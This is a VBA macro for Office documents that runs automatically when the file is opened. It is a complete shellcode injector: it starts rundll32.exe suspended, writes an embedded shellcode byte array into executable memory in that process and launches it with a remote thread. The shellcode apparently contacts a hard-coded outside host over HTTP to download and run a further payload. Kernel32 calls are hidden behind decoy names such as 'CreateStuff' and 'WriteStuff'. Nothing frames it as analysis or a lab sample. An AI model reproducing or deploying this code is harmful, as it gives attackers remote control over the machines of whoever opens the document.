Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (
        ByVal hProcess As Long, 
        ByVal lpThreadAttributes As Long, 
        ByVal dwStackSize As Long, 
        ByVal lpStartAddress As Long, 
        lpParameter As Long, 
        ByVal dwCreationFlags As Long, 
        lpThreadID As Long
    ) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (
        ByVal hProcess As Long, 
        ByVal lpAddr As Long, 
        ByVal lSize As Long, 
        ByVal flAllocationType As Long, 
        ByVal flProtect As Long
    ) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (
        ByVal hProcess As Long, 
        ByVal lDest As Long,
        ByRef Source As Any, 
        ByVal Length As Long, 
        ByVal LengthWrote As Long
    ) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (
        ByVal lpApplicationName As String, 
        ByVal lpCommandLine As String, 
        lpProcessAttributes As Any, 
        lpThreadAttributes As Any, 
        ByVal bInheritHandles As Long, 
        ByVal dwCreationFlags As Long, 
        lpEnvironment As Any, 
        ByVal lpCurrentDriectory As String, 
        lpStartupInfo As STARTUPINFO, 
        lpProcessInformation As PROCESS_INFORMATION
    ) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

    #If VBA7 Then
        Dim rwxpage As LongPtr, res As LongPtr
    #Else
        Dim rwxpage As Long, res As Long
    #End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _
-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _
104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _
-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _
-1,-1,47,104,55,113,76,0,-64,-89,-9,-97,-35,-61,-2,67,-43,-76,-7,-112,84,-36,22,-7,16,53,19,-31,10,-80,108,-37,-14,26,-10,113,40,56,-114,-98, _
92,-39,-88,-5,79,-69,-88,-9,27,40,-87,7,111,29,13,2,76,-49,-60,-4,-47,-74,-64,20,-27,-74,-112,45,-88,-61,-3,103,-19,11,-121,23,69,65,106,-75, _
87,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,56,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,84,114,105,100,101,110,116,47,52,46,48,59,32,81,81, _
68,111,119,110,108,111,97,100,32,55,51,51,59,32,73,110,102,111,80,97,116,104,46,50,41,13,10,0,-111,-101,90,56,32,-115,-23,-46,-92,90,98,26, _
93,-84,-29,-103,28,86,81,-101,-43,88,-56,-37,-28,-52,75,-99,60,-123,-63,-92,109,23,-13,71,32,124,-3,-51,72,6,28,32,21,23,100,-38,9,121,99,114, _
-26,54,-2,84,45,-95,-32,90,-108,20,-74,50,66,116,-113,-28,-31,49,-55,-23,-81,120,53,32,-127,31,8,23,20,-80,20,-50,-122,113,-19,5,67,-35,72,-38, _
108,-128,-52,-46,30,-35,49,78,-62,20,-63,-124,-116,-41,-100,-95,-49,117,82,83,49,-77,35,103,6,-122,77,-57,106,-33,-46,36,-76,4,-30,-23,18,119,54,-121, _
-54,119,0,-81,-125,-46,87,32,-110,-33,-103,52,-71,-116,-15,25,101,-37,108,51,15,88,-6,-33,68,-119,-97,-8,-24,7,6,-30,-128,1,102,-9,-41,33,34,59, _
12,-124,78,3,-105,-100,-84,-105,-52,88,12,113,124,-116,69,82,-66,-124,63,96,-36,38,69,14,-111,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _
-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,48,46,49,46,49,46,49,51,49,0,0,1,-122,-96)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
